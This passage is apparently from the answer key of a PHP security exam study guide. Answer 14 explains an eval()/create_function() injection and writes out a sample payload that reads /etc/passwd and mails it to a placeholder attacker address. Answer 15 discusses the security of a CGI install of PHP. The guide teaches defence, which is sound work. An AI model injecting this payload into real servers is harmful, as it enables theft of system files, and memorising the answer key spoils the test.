    14. The correct answer is D. Even if it is hidden, this code snippet can allow
    the user to execute arbitrary code on the server. Although it is part of a math
    operation, consider what would happen if $_POST[''number''] contained the following
    string:


    ```

    eval("exec(\''cat /etc/passwd | mail baduser@somewhere.com\'');")) 0 : 1

    ```


    This would turn the anonymous function into:


    ```

    return $a * (eval("exec(\''cat /etc/passwd | mail baduser@somewhere.com\'');"))
    0 : 1;

    ```


    Which effectively allows the user to execute arbitrary code within the eval()
    statement while still returning what might seem like a "valid" value. Any time
    code is being executed dynamically, for instance using create_function() or eval(),
    it is extremely important that the dynamic aspects of it be checked and re-checked
    to make sure no injections are possible!


    15. Although any improperly-installed version of PHP can lead to security problems,
    the CGI setup is the least secure of the ones listed, as, by default, it suffers
    from several potential issues, as well as significantly inferior performance,
    that need to be addressed before the server can be put online. Therefore, Answer
    C is correct.'
